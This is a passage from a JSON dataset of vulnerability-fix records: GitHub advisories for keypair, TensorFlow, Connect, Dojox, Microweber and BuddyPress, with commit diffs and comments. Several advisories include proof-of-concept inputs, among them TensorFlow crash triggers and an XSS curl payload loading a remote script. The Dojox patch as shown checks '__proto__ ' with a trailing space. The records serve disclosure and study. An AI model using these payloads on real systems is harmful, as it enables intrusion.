brevity)\n\n```\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00....\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n```\n\nSince it is masking with 0xFF, approximately 97% of the bytes are converted to zeros. The impact is that each byte in the RNG seed has a 97% chance of being 0 due to incorrect conversion.\n\n## Credit\n\nThis issue was reported to GitHub Security Lab by Ross Wheeler of Axosoft. It was discovered by Axosoft engineer Dan Suceava, who noticed that [keypair](https:\/\/github.com\/juliangruber\/keypair) was regularly generating duplicate RSA keys. GitHub security engineer [@vcsjones (Kevin Jones)](https:\/\/github.com\/vcsjones) independently investigated the problem and identified the cause and source code location of the bug.","published_date":"2021-10-11","chain_len":1,"project":"https:\/\/github.com\/juliangruber\/keypair","commit_href":"https:\/\/github.com\/juliangruber\/keypair\/commit\/9596418d3363d3e757676c0b6a8f2d35a9d1cb18","commit_sha":"9596418d3363d3e757676c0b6a8f2d35a9d1cb18","patch":"SINGLE","chain_ord":"['9596418d3363d3e757676c0b6a8f2d35a9d1cb18']","before_first_fix_commit":"{'87c62f255baa12c1ec4f98a91600f82af80be6db'}","last_fix_commit":"9596418d3363d3e757676c0b6a8f2d35a9d1cb18","chain_ord_pos":1.0,"commit_datetime":"10\/11\/2021, 17:01:56","message":"Merge pull request from GHSA-3f99-hvg4-qjwj\n\n* fix double String.fromCharCode\n\n* use crypto module if available\n\nCo-authored-by: Julian Gruber <julian@juliangruber.com>","author":"Kevin Backhouse","comments":"{'com_1': {'author': 'ChALkeR', 'datetime': '10\/12\/2021, 16:44:04', 'body': \"How is this a fix?\\r\\n\\r\\nThis looks like it still falls back to xorshift128+ for the purpose of ssh keys generation?\\r\\n\\r\\nThat... doesn't look like a good idea perhaps.\\r\\n\\r\\nWhy is `Math.random` based code even present there?\\r\\n\\r\\nThe environments where there is no way to generate the key in a secure way should fail, and not fall back to a predictable pseudo-random generator.\\r\\n\\r\\n_Note: not considering this confidential, as this is all over Twitter now afaik._\"}, 'com_2': {'author': 'juliangruber', 'datetime': '10\/13\/2021, 08:21:54', 'body': \"I'm not a security researcher myself so I'm preferring to relay judgement of this issue to those who are, which has happened in this advisory.\\r\\n\\r\\nAt this point I'm not going to perform any major changes to this library myself. If you want to contribute, would you consider making a docs PR with your concerns, adding a disclaimer to the README?\"}, 'com_3': {'author': 'normanr', 'datetime': '10\/13\/2021, 16:04:03', 'body': 'Thank you for responding promptly to the security researchers and taking the time to merge this security fix. A good example of how to handle security related bug reports.'}}","stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'index.js': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/juliangruber\/keypair\/raw\/9596418d3363d3e757676c0b6a8f2d35a9d1cb18\/index.js', 'patch': \"@@ -756,7 +756,11 @@ util.createBuffer = function(input, encoding) {\\n  *\/\\n \\n var prng = forge.prng = {};\\n-var crypto = null;\\n+\\n+var crypto;\\n+try {\\n+  crypto = require('crypto');\\n+} catch (_) {}\\n \\n prng.create = function(plugin) {\\n   var ctx = {\\n@@ -1005,7 +1009,7 @@ prng.create = function(plugin) {\\n           \/\/ throw in more pseudo random\\n           next = seed >>> (i << 3);\\n           next ^= Math.floor(Math.random() * 0xFF);\\n-          b.putByte(String.fromCharCode(next & 0xFF));\\n+          b.putByte(next & 0xFF);\\n         }\\n       }\\n     }\"}}","message_norm":"merge pull request from ghsa-3f99-hvg4-qjwj\n\n* fix double string.fromcharcode\n\n* use crypto module if available\n\nco-authored-by: julian gruber <julian@juliangruber.com>","language":"en","entities":"[('ghsa-3f99-hvg4-qjwj', 'VULNID', 'GHSA'), ('fix', 'ACTION', ''), ('crypto', 'SECWORD', ''), ('julian@juliangruber.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":246,"vuln_id":"GHSA-3ff2-r28g-w7h9","cwe_id":"{'CWE-787', 'CWE-120'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ba87153ee343401dbe9d1954d7f79e521eb14'}","dataset":"osv","summary":"Heap buffer overflow in `Transpose` ### Impact\nThe [shape inference function for `Transpose`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/ops\/array_ops.cc#L121-L185) is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])\n  return y\n\ntest()\n```\n\nThis occurs whenever `perm` contains negative elements. The shape inference function does not validate that the indices in `perm` are all valid:\n        \n```cc\nfor (int32_t i = 0; i < rank; ++i) {\n  int64_t in_idx = data[i];\n  if (in_idx >= rank) {\n    return errors::InvalidArgument(\"perm dim \", in_idx,\n                                   \" is out of range of input rank \", rank);\n  }\n  dims[i] = c->Dim(input, in_idx);\n}\n```\n\nwhere `Dim(tensor, index)` accepts either a positive index less than the rank of the tensor or the special value `-1` for unknown dimensions.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ba87153ee343401dbe9d1954d7f79e521eb14](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ba87153ee343401dbe9d1954d7f79e521eb14).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ba87153ee343401dbe9d1954d7f79e521eb14","commit_sha":"c79ba87153ee343401dbe9d1954d7f79e521eb14","patch":"SINGLE","chain_ord":"['c79ba87153ee343401dbe9d1954d7f79e521eb14']","before_first_fix_commit":"{'042dc3be4c54a51c2608ad53dabaeb34afa3e63c'}","last_fix_commit":"c79ba87153ee343401dbe9d1954d7f79e521eb14","chain_ord_pos":1.0,"commit_datetime":"10\/15\/2021, 02:39:00","message":"Make Transpose's shape inference function validate that negative `perm` values are within the tensor's rank.\n\nPiperOrigin-RevId: 403252853\nChange-Id: Ia6b31b45b237312668bb31c2c3b3c7bbce2d2610","author":"Penporn Koanantakool","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/core\/ops\/array_ops.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c79ba87153ee343401dbe9d1954d7f79e521eb14\/tensorflow%2Fcore%2Fops%2Farray_ops.cc', 'patch': '@@ -168,7 +168,7 @@ Status TransposeShapeFn(InferenceContext* c) {\\n \\n     for (int32_t i = 0; i < rank; ++i) {\\n       int64_t in_idx = data[i];\\n-      if (in_idx >= rank) {\\n+      if (in_idx >= rank || in_idx <= -rank) {\\n         return errors::InvalidArgument(\"perm dim \", in_idx,\\n                                        \" is out of range of input rank \", rank);\\n       }'}}","message_norm":"make transpose's shape inference function validate that negative `perm` values are within the tensor's rank.\n\npiperorigin-revid: 403252853\nchange-id: ia6b31b45b237312668bb31c2c3b3c7bbce2d2610","language":"en","entities":"[('validate', 'ACTION', ''), ('403252853', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/ops\/array_ops.cc'])","num_files":1.0},{"index":251,"vuln_id":"GHSA-3fw8-66wf-pr7m","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/senchalabs\/connect\/commit\/126187c4e12162e231b87350740045e5bb06e93a', 'https:\/\/github.com\/senchalabs\/connect\/commit\/277e5aad6a95d00f55571a9a0e11f2fa190d8135'}","dataset":"osv","summary":"methodOverride Middleware Reflected Cross-Site Scripting in connect Connect is a stack of middleware that is executed in order in each request.\n\nThe \"methodOverride\" middleware allows the http post to override the method of the request with the value of the \"_method\" post key or with the header \"x-http-method-override\".\n\nBecause the user post input was not checked, req.method could contain any kind of value. Because the req.method did not match any common method VERB, connect answered with a 404 page containing the \"Cannot `[method]` `[url]`\" content. The method was not properly encoded for output in the browser.\n\n\n###Example:\n```\n~ curl \"localhost:3000\" -d \"_method=<script src=http:\/\/nodesecurity.io\/xss.js><\/script>\"\nCannot <SCRIPT SRC=HTTP:\/\/NODESECURITY.IO\/XSS.JS><\/SCRIPT> \/\n```\n\n## Recommendation\n\nUpdate to the newest version of Connect or disable methodOverride. It is not possible to avoid the vulnerability if you have enabled this middleware in the top of your stack.","published_date":"2020-08-31","chain_len":2,"project":"https:\/\/github.com\/senchalabs\/connect","commit_href":"https:\/\/github.com\/senchalabs\/connect\/commit\/277e5aad6a95d00f55571a9a0e11f2fa190d8135","commit_sha":"277e5aad6a95d00f55571a9a0e11f2fa190d8135","patch":"MULTI","chain_ord":"['277e5aad6a95d00f55571a9a0e11f2fa190d8135', '126187c4e12162e231b87350740045e5bb06e93a']","before_first_fix_commit":"{'b0df35bcf2e1b4e487a17889a8440ecf254ac3b4'}","last_fix_commit":"126187c4e12162e231b87350740045e5bb06e93a","chain_ord_pos":1.0,"commit_datetime":"06\/27\/2013, 15:31:23","message":"fix: escape req.method in 404 response","author":"TJ Holowaychuk","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'lib\/proto.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/senchalabs\/connect\/raw\/277e5aad6a95d00f55571a9a0e11f2fa190d8135\/lib%2Fproto.js', 'patch': \"@@ -152,7 +152,7 @@ app.handle = function(req, res, out) {\\n         res.statusCode = 404;\\n         res.setHeader('Content-Type', 'text\/plain');\\n         if ('HEAD' == req.method) return res.end();\\n-        res.end('Cannot ' + req.method + ' ' + utils.escape(req.originalUrl));\\n+        res.end('Cannot ' + utils.escape(req.method) + ' ' + utils.escape(req.originalUrl));\\n       }\\n       return;\\n     }\\n@@ -202,7 +202,7 @@ app.handle = function(req, res, out) {\\n  * Listen for connections.\\n  *\\n  * This method takes the same arguments\\n- * as node's `http.Server#listen()`.  \\n+ * as node's `http.Server#listen()`.\\n  *\\n  * HTTP and HTTPS:\\n  *\\n@@ -214,9 +214,9 @@ app.handle = function(req, res, out) {\\n  *      var connect = require('connect')\\n  *        , http = require('http')\\n  *        , https = require('https');\\n- *      \\n+ *\\n  *      var app = connect();\\n- *      \\n+ *\\n  *      http.createServer(app).listen(80);\\n  *      https.createServer(options, app).listen(443);\\n  *\"}}","message_norm":"fix: escape req.method in 404 response","language":"en","entities":"[('fix', 'ACTION', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/proto.js'])","num_files":1.0},{"index":255,"vuln_id":"GHSA-3h8m-483j-7xxm","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef0c008ee84bad91ec6725ddc42091e19a30cf0e'}","dataset":"osv","summary":"Heap out of bounds read in `RequantizationRange` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1], shape=[1], dtype=tf.qint32) \ninput_max = tf.constant([], dtype=tf.float32)\ninput_min = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ac328eaa3870491ababc147822cd04e91a790643\/tensorflow\/core\/kernels\/requantization_range_op.cc#L49-L50) assumes that the `input_min` and `input_max` tensors have at least one element, as it accesses the first element in two arrays:\n\n```cc\nconst float input_min_float = ctx->input(1).flat<float>()(0);\nconst float input_max_float = ctx->input(2).flat<float>()(0);\n```\n\nIf the tensors are empty, `.flat<T>()` is an empty object, backed by an empty array. Hence, accesing even the 0th element is a read outside the bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [ef0c008ee84bad91ec6725ddc42091e19a30cf0e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef0c008ee84bad91ec6725ddc42091e19a30cf0e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef0c008ee84bad91ec6725ddc42091e19a30cf0e","commit_sha":"ef0c008ee84bad91ec6725ddc42091e19a30cf0e","patch":"SINGLE","chain_ord":"['ef0c008ee84bad91ec6725ddc42091e19a30cf0e']","before_first_fix_commit":"{'ac328eaa3870491ababc147822cd04e91a790643'}","last_fix_commit":"ef0c008ee84bad91ec6725ddc42091e19a30cf0e","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 15:16:13","message":"Fix out of bound read in requantization_range_op.cc\n\nPiperOrigin-RevId: 372129031\nChange-Id: Ie684ab98a3840c5186ead3eafffc0e0ed0e8030d","author":"Laura Pak","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/requantization_range_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ef0c008ee84bad91ec6725ddc42091e19a30cf0e\/tensorflow%2Fcore%2Fkernels%2Frequantization_range_op.cc', 'patch': '@@ -46,6 +46,10 @@ class RequantizationRangeOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& input = ctx->input(0);\\n+    OP_REQUIRES(ctx, ctx->input(1).NumElements() > 0,\\n+                errors::InvalidArgument(\"Input min must not be empty.\"));\\n+    OP_REQUIRES(ctx, ctx->input(2).NumElements() > 0,\\n+                errors::InvalidArgument(\"Input max must not be empty.\"));\\n     const float input_min_float = ctx->input(1).flat<float>()(0);\\n     const float input_max_float = ctx->input(2).flat<float>()(0);\\n     Tensor* output_min = nullptr;'}}","message_norm":"fix out of bound read in requantization_range_op.cc\n\npiperorigin-revid: 372129031\nchange-id: ie684ab98a3840c5186ead3eafffc0e0ed0e8030d","language":"en","entities":"[('fix', 'ACTION', ''), ('out of bound read', 'SECWORD', ''), ('372129031', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/requantization_range_op.cc'])","num_files":1.0},{"index":260,"vuln_id":"GHSA-3hw5-q855-g6cw","cwe_id":"{'CWE-94'}","score":7.7,"chain":"{'https:\/\/github.com\/dojo\/dojox\/commit\/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da'}","dataset":"osv","summary":"Prototype Pollution in Dojox The Dojox jQuery wrapper `jqMix` mixin method is vulnerable to Prototype Pollution. \n\nAffected Area:\n```\n\/\/https:\/\/github.com\/dojo\/dojox\/blob\/master\/jq.js#L442\n\t\tvar tobj = {};\n\t\tfor(var x in props){\n\t\t\t\/\/ the \"tobj\" condition avoid copying properties in \"props\"\n\t\t\t\/\/ inherited from Object.prototype.  For example, if obj has a custom\n\t\t\t\/\/ toString() method, don't overwrite it with the toString() method\n\t\t\t\/\/ that props inherited from Object.prototype\n\t\t\tif((tobj[x] === undefined || tobj[x] != props[x]) && props[x] !== undefined && obj != props[x]){\n\t\t\t\tif(dojo.isObject(obj[x]) && dojo.isObject(props[x])){\n\t\t\t\t\tif(dojo.isArray(props[x])){\n\t\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t\t}else{\n\t\t\t\t\t\tobj[x] = jqMix(obj[x], props[x]);\n\t\t\t\t\t}\n\t\t\t\t}else{\n\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t}\n```","published_date":"2020-03-10","chain_len":1,"project":"https:\/\/github.com\/dojo\/dojox","commit_href":"https:\/\/github.com\/dojo\/dojox\/commit\/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da","commit_sha":"47d1b302b5b23d94e875b77b9b9a8c4f5622c9da","patch":"SINGLE","chain_ord":"['47d1b302b5b23d94e875b77b9b9a8c4f5622c9da']","before_first_fix_commit":"{'5491effdb1b586f1a5f5b173460fe26e23abcfe6'}","last_fix_commit":"47d1b302b5b23d94e875b77b9b9a8c4f5622c9da","chain_ord_pos":1.0,"commit_datetime":"03\/10\/2020, 14:25:04","message":"Merge pull request from GHSA-3hw5-q855-g6cw\n\nPrevent the special __proto__ property name from being mixed in to\nprevent polluting the prototoype of the object being mixed into in the\njqMix function in jq.js","author":"Nick Nisi","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'jq.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dojo\/dojox\/raw\/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da\/jq.js', 'patch': \"@@ -455,7 +455,7 @@ dojo.query differences that cause some tests to fail:\\n \\t\\t\\t\/\/ inherited from Object.prototype.  For example, if obj has a custom\\n \\t\\t\\t\/\/ toString() method, don't overwrite it with the toString() method\\n \\t\\t\\t\/\/ that props inherited from Object.prototype\\n-\\t\\t\\tif((tobj[x] === undefined || tobj[x] != props[x]) && props[x] !== undefined && obj != props[x]){\\n+\\t\\t\\tif(x !== '__proto__ ' && ((tobj[x] === undefined || tobj[x] != props[x])) && props[x] !== undefined && obj != props[x]){\\n \\t\\t\\t\\tif(dojo.isObject(obj[x]) && dojo.isObject(props[x])){\\n \\t\\t\\t\\t\\tif(dojo.isArray(props[x])){\\n \\t\\t\\t\\t\\t\\tobj[x] = props[x];\"}}","message_norm":"merge pull request from ghsa-3hw5-q855-g6cw\n\nprevent the special __proto__ property name from being mixed in to\nprevent polluting the prototoype of the object being mixed into in the\njqmix function in jq.js","language":"en","entities":"[('ghsa-3hw5-q855-g6cw', 'VULNID', 'GHSA'), ('prevent', 'ACTION', ''), ('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['jq.js'])","num_files":1.0},{"index":262,"vuln_id":"GHSA-3hxh-8cp2-g4hg","cwe_id":"{'CWE-416'}","score":6.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ee119d4a498979525046fba1c3dd3f13a039fbb1'}","dataset":"osv","summary":"Use after free and segfault in shape inference functions ### Impact\nWhen running shape functions, some functions (such as `MutableHashTableShape`) produce extra output information in the form of a `ShapeAndType` struct. The shapes embedded in this struct are owned by an inference context that is cleaned up almost immediately; if the upstream code attempts to access this shape information, it can trigger a segfault.\n\n`ShapeRefiner` is mitigating this for normal output shapes by cloning them (and thus putting the newly created shape under ownership of an inference context that will not die), but we were not doing the same for shapes and types. This commit fixes that by doing similar logic on output shapes and types.\n\n### Patches\nWe have patched the issue in GitHub commit [ee119d4a498979525046fba1c3dd3f13a039fbb1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ee119d4a498979525046fba1c3dd3f13a039fbb1).                                                                                                          \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ee119d4a498979525046fba1c3dd3f13a039fbb1","commit_sha":"ee119d4a498979525046fba1c3dd3f13a039fbb1","patch":"SINGLE","chain_ord":"['ee119d4a498979525046fba1c3dd3f13a039fbb1']","before_first_fix_commit":"{'f118ff1538ac7aa8a628bba03fe66dc6811cc7fc'}","last_fix_commit":"ee119d4a498979525046fba1c3dd3f13a039fbb1","chain_ord_pos":1.0,"commit_datetime":"07\/14\/2021, 19:43:17","message":"Fix segmentation fault in shape inference logic.\n\nWhen running shape functions, some functions (such as `MutableHashTableShape`)\nproduce extra output information in the form of a `ShapeAndType` struct.  The\nshapes embedded in this struct are owned by an inference context that is\ncleaned up almost immediately; if the upstream code attempts to access this\nshape information, it can trigger a segfault.\n\n`ShapeRefiner` is mitigating this for normal output shapes by cloning them\n(and thus putting the newly created shape under ownership of an inference\ncontext that will not die), but we were not doing the same for shapes and\ntypes.  This commit fixes that by doing similar logic on output shapes and\ntypes.\n\nPiperOrigin-RevId: 384761124\nChange-Id: I07c0c42d29dfbb55bfa13ec1f09ef825fb0a1a1d","author":"Daniel Ellis","comments":null,"stats":"{'additions': 19, 'deletions': 2, 'total': 21}","files":"{'tensorflow\/core\/common_runtime\/shape_refiner.cc': {'additions': 19, 'deletions': 2, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ee119d4a498979525046fba1c3dd3f13a039fbb1\/tensorflow%2Fcore%2Fcommon_runtime%2Fshape_refiner.cc', 'patch': '@@ -120,9 +120,26 @@ Status ShapeRefiner::InferShapesForFunctionSubNode(\\n     TF_RETURN_IF_ERROR(outer_context->MakeShapeFromShapeProto(proto, &handle));\\n     outer_context->set_output(index, handle);\\n \\n-    auto* resource = node_context->input_handle_shapes_and_types(0);\\n+    const std::vector<ShapeAndType>* resource =\\n+        node_context->input_handle_shapes_and_types(0);\\n     if (resource) {\\n-      outer_context->set_output_handle_shapes_and_types(index, *resource);\\n+      \/\/ `ShapesAndType`s contain `ShapeHandle`s.  These `ShapeHandle`s point\\n+      \/\/ to `Shape`s that are owned by a different inference context too.  We\\n+      \/\/ need to copy them to the outer context to prevent them from being\\n+      \/\/ destroyed before they are used.\\n+      std::vector<ShapeAndType> copied_shapes_and_types;\\n+      for (auto& shape_and_type : *resource) {\\n+        ShapeHandle handle;\\n+        TensorShapeProto proto;\\n+        node_context->ShapeHandleToProto(shape_and_type.shape, &proto);\\n+        TF_RETURN_IF_ERROR(\\n+            outer_context->MakeShapeFromShapeProto(proto, &handle));\\n+        copied_shapes_and_types.push_back(\\n+            ShapeAndType(handle, shape_and_type.dtype, shape_and_type.type));\\n+      }\\n+\\n+      outer_context->set_output_handle_shapes_and_types(\\n+          index, copied_shapes_and_types);\\n     }\\n   }'}}","message_norm":"fix segmentation fault in shape inference logic.\n\nwhen running shape functions, some functions (such as `mutablehashtableshape`)\nproduce extra output information in the form of a `shapeandtype` struct.  the\nshapes embedded in this struct are owned by an inference context that is\ncleaned up almost immediately; if the upstream code attempts to access this\nshape information, it can trigger a segfault.\n\n`shaperefiner` is mitigating this for normal output shapes by cloning them\n(and thus putting the newly created shape under ownership of an inference\ncontext that will not die), but we were not doing the same for shapes and\ntypes.  this commit fixes that by doing similar logic on output shapes and\ntypes.\n\npiperorigin-revid: 384761124\nchange-id: i07c0c42d29dfbb55bfa13ec1f09ef825fb0a1a1d","language":"en","entities":"[('fix', 'ACTION', ''), ('segmentation fault', 'SECWORD', ''), ('segfault', 'SECWORD', ''), ('mitigating', 'ACTION', ''), ('fixes', 'ACTION', ''), ('384761124', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/shape_refiner.cc'])","num_files":1.0},{"index":263,"vuln_id":"GHSA-3j58-p785-f27x","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/fc7e1a026735b93f0e0047700d08c44954fce9ce'}","dataset":"osv","summary":"Cross-site Scripting in microweber There is a reflected cross sitem scripting attack in microweber via url parameters.","published_date":"2022-01-28","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/fc7e1a026735b93f0e0047700d08c44954fce9ce","commit_sha":"fc7e1a026735b93f0e0047700d08c44954fce9ce","patch":"SINGLE","chain_ord":"['fc7e1a026735b93f0e0047700d08c44954fce9ce']","before_first_fix_commit":"{'6e9fcaa043b4211ef21a494f9892dd19ba8a572c'}","last_fix_commit":"fc7e1a026735b93f0e0047700d08c44954fce9ce","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2022, 10:33:18","message":"fix xss on module api call in value parameters","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'src\/MicroweberPackages\/App\/Http\/Controllers\/ApiController.php': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/fc7e1a026735b93f0e0047700d08c44954fce9ce\/src%2FMicroweberPackages%2FApp%2FHttp%2FControllers%2FApiController.php', 'patch': \"@@ -17,9 +17,6 @@\\n class ApiController  extends FrontendController\\n {\\n \\n-\\n-\\n-\\n     public function api_html()\\n     {\\n         if (!defined('MW_API_HTML_OUTPUT')) {\\n@@ -609,12 +606,14 @@ public function module()\\n \\n         $request_data = array_merge($_GET, $_POST);\\n \\n-\\n         \/\/ sanitize attributes\\n         if($request_data){\\n             $request_data_new = [];\\n             $antixss = new AntiXSS();\\n             foreach ($request_data as $k=>$v){\\n+\\n+                $v = $antixss->xss_clean($v);\\n+\\n                 if(is_string($k)){\\n                     $k = $antixss->xss_clean($k);\\n                     if($k){\\n@@ -623,6 +622,7 @@ public function module()\\n                 } else {\\n                     $request_data_new[$k] = $v;\\n                 }\\n+                \\n             }\\n             $request_data = $request_data_new;\\n         }\"}}","message_norm":"fix xss on module api call in value parameters","language":"ca","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/Http\/Controllers\/ApiController.php'])","num_files":1.0},{"index":264,"vuln_id":"GHSA-3j78-7m59-r7gv","cwe_id":"{'CWE-284'}","score":8.0,"chain":"{'https:\/\/github.com\/buddypress\/BuddyPress\/commit\/39294680369a0c992290577a9d740f4a2f2c2ca3'}","dataset":"osv","summary":"Private data exposure via REST API in BuddyPress In BuddyPress before 5.1.2, requests to a certain REST API endpoint can result in private user data getting exposed. Authentication is not needed.\n\nThis has been patched in version 5.1.2.","published_date":"2020-02-24","chain_len":1,"project":"https:\/\/github.com\/buddypress\/BuddyPress","commit_href":"https:\/\/github.com\/buddypress\/BuddyPress\/commit\/39294680369a0c992290577a9d740f4a2f2c2ca3","commit_sha":"39294680369a0c992290577a9d740f4a2f2c2ca3","patch":"SINGLE","chain_ord":"['39294680369a0c992290577a9d740f4a2f2c2ca3']","before_first_fix_commit":"{'98da00c5892ccc7aca5702ffd43d651cb78c0c7c'}","last_fix_commit":"39294680369a0c992290577a9d740f4a2f2c2ca3","chain_ord_pos":1.0,"commit_datetime":"01\/31\/2020, 16:32:54","message":"Admin: Sanitize external links to activated BP component pages.\n\nProps imath.\nSee #8235.\n\ngit-svn-id: https:\/\/buddypress.svn.wordpress.org\/trunk@12549 cdf35c40-ae34-48e0-9cc9-0c9da1808c22","author":"Mercime","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/bp-core\/admin\/bp-core-admin-slugs.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/buddypress\/buddypress\/raw\/39294680369a0c992290577a9d740f4a2f2c2ca3\/src%2Fbp-core%2Fadmin%2Fbp-core-admin-slugs.php', 'patch': '@@ -145,7 +145,7 @@ function bp_core_admin_slugs_options() {\\n \\n \\t\\t\\t\\t\\t\\t\\t<?php if ( !empty( $existing_pages[$name] ) ) : ?>\\n \\n-\\t\\t\\t\\t\\t\\t\\t\\t<a href=\"<?php echo get_permalink( $existing_pages[$name] ); ?>\" class=\"button-secondary\" target=\"_bp\"><?php _e( \\'View\\', \\'buddypress\\' ); ?><\/a>\\n+\\t\\t\\t\\t\\t\\t\\t\\t<a href=\"<?php echo esc_url( get_permalink( $existing_pages[$name] ) ); ?>\" class=\"button-secondary\" target=\"_bp\"><?php _e( \\'View\\', \\'buddypress\\' ); ?><\/a>\\n \\n \\t\\t\\t\\t\\t\\t\\t<?php endif; ?>'}}","message_norm":"admin: sanitize external links to activated bp component pages.\n\nprops imath.\nsee #8235.\n\ngit-svn-id: https:\/\/buddypress.svn.wordpress.org\/trunk@12549 cdf35c40-ae34-48e0-9cc9-0c9da1808c22","language":"en","entities":"[('admin', 'SECWORD', ''), ('sanitize', 'SECWORD', ''), ('#8235', 'ISSUE', ''), 